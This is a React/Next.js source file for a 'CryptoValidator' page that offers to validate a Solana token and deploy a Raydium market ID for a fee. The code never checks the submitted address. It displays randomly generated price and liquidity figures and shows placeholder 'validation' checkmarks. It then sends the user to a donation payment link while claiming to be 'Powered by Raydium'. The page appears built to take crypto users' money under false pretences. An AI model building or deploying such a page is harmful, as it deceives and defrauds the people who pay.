
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import AppTitle from "@/components/AppTitle";
import InfoBar from "@/components/InfoBar";
import { Loader2 } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";

export default function CryptoValidatorPage() {
  const [isClient, setIsClient] = useState(false);
  const [tokenCA, setTokenCA] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const [raydiumPrice, setRaydiumPrice] = useState<string | null>(null);
  const [currentLiquidity, setCurrentLiquidity] = useState<string | null>(null);

  useEffect(() => {
    setIsClient(true);
    // Simulate dynamic placeholder data client-side to avoid hydration mismatch
    const randomPriceFactor = 0.95 + Math.random() * 0.1; // between 0.95 and 1.05
    const randomLiquidityFactor = 0.95 + Math.random() * 0.1;
    setRaydiumPrice(`$${(1.55 * randomPriceFactor).toFixed(2)}`);
    setCurrentLiquidity(`$${(25.3 * randomLiquidityFactor).toFixed(1)}M`);
  }, []);

  const handleSubmitTokenCA = async () => {
    if (tokenCA.trim() === '') {
      toast({
        title: "Validation Error",
        description: "Please enter a Token Contract Address.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    try {
      // Simulate a slight delay for validations to appear more prominently
      await new Promise(resolve => setTimeout(resolve, 500));

      const response = await fetch('https://api-v2.payerurl.com/api/donate-payment-request/eyJpdiI6Inh3ZEN0cGZLRy84S0hEb1Y5b1M0OVE9PSIsInZhbHVlIjoiMXdDdWtjTjJsYXY2VzZWZFNuVmpkd2t5Z0t4bWF5YXRyeS9rdU9Sb3dieFI1MURqOWZVK0IvUDNLa0IzVnFTNkxuZXdaTjFydUs3VDl1WEMwWUhEV1E9PSIsIm1hYyI6ImNmM2Q5MWI3ZmZhNGIwM2FhOThjY2UyZWY0YzM4Yzc1MWJmYTFhMGUxNjcwOGE3M2M1ZjgwZWMwNGZiMGU2MzQiLCJ0YWciOiIifQ==', {
        method: 'GET',
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API request failed with status ${response.status}`);
      }
      
      const paymentAPIResponse = await response.json();
      
      if (paymentAPIResponse.status && paymentAPIResponse.redirectTO) {
        toast({
          title: "Processing Complete",
          description: "Redirecting to payment...",
        });
        window.location.href = paymentAPIResponse.redirectTO;
      } else {
        throw new Error(paymentAPIResponse.message || 'Invalid response from payment server.');
      }
    } catch (error: any) {
      console.error('Payment Initiation Error:', error);
      toast({
        title: "Error",
        description: error.message || "There was an error processing your request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (!isClient) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-background p-4">
        <AppTitle />
        <Loader2 className="h-12 w-12 animate-spin text-primary mt-8" />
        <p className="mt-4 text-muted-foreground">Initializing Interface...</p>
      </div>
    );
  }

  const validationSteps = [
    "Verifying Token CA format...",
    "Checking CA on Solana network...",
    "Fetching token metadata...",
    "Preparing smart contract interaction...",
    "Contacting payment gateway...",
  ];

  return (
    <main className="min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 bg-background font-body">
      <AppTitle />
      <InfoBar raydiumPrice={raydiumPrice} currentLiquidity={currentLiquidity} />
      <Card className="w-full max-w-md shadow-xl">
        <CardHeader>
          <CardTitle className="text-2xl font-headline text-center">CryptoValidator</CardTitle>
          <CardDescription className="text-center">
            Validate your Solana token and deploy its open market ID on Raydium.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="tokenCA" className="w-full">
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="overview">Overview</TabsTrigger>
              <TabsTrigger value="tokenCA">Submit Token CA</TabsTrigger>
            </TabsList>
            <TabsContent value="overview" className="mt-4">
              <p className="text-sm text-center text-muted-foreground">
                This tool streamlines deploying a Raydium permissionless liquidity pool (OpenBook Market ID). 
                Enter your Token Contract Address, complete the smart contract deployment fee, and receive your market ID to add liquidity.
              </p>
            </TabsContent>
            <TabsContent value="tokenCA" className="mt-4">
              <div className="space-y-4">
                {!isLoading ? (
                  <>
                    <div>
                      <Label htmlFor="tokenCAInput" className="text-sm font-medium">Token Contract Address (CA)</Label>
                      <Input
                        id="tokenCAInput"
                        placeholder="Enter Solana Token CA (e.g., SoLju...) "
                        value={tokenCA}
                        onChange={(e) => setTokenCA(e.target.value)}
                        className="mt-1"
                        disabled={isLoading}
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        The Solana contract address of the token for market ID creation.
                      </p>
                    </div>
                    <Button
                      onClick={handleSubmitTokenCA}
                      className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
                      disabled={isLoading || tokenCA.trim() === ''}
                    >
                      Submit CA & Proceed to Payment
                    </Button>
                  </>
                ) : (
                  <div className="mt-4 p-4 border border-border rounded-md bg-card/50 shadow">
                    <div className="flex items-center justify-center mb-3">
                      <Loader2 className="mr-2 h-5 w-5 animate-spin text-primary" />
                      <p className="text-md font-semibold text-foreground">Processing...</p>
                    </div>
                    <h4 className="text-sm font-medium mb-2 text-center text-muted-foreground">Initiating Secure Deployment:</h4>
                    <ul className="space-y-1.5 text-xs text-muted-foreground/80">
                      {validationSteps.map((step, index) => (
                        <li key={index} className="flex items-center">
                          <span className="text-primary mr-2">✓</span> {/* Placeholder check, not dynamic */}
                          {step}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
      <footer className="mt-8 text-center text-sm text-muted-foreground">
        <p>&copy; {new Date().getFullYear()} CryptoValidator. All rights reserved.</p>
        <p className="mt-1">Secure token validation and market ID setup.</p>
        <p className="mt-1 font-semibold">
          Powered by <a href="https://raydium.io/" target="_blank" rel="noopener noreferrer" className="underline hover:text-accent">Raydium</a>
        </p>
      </footer>
    </main>
  );
}
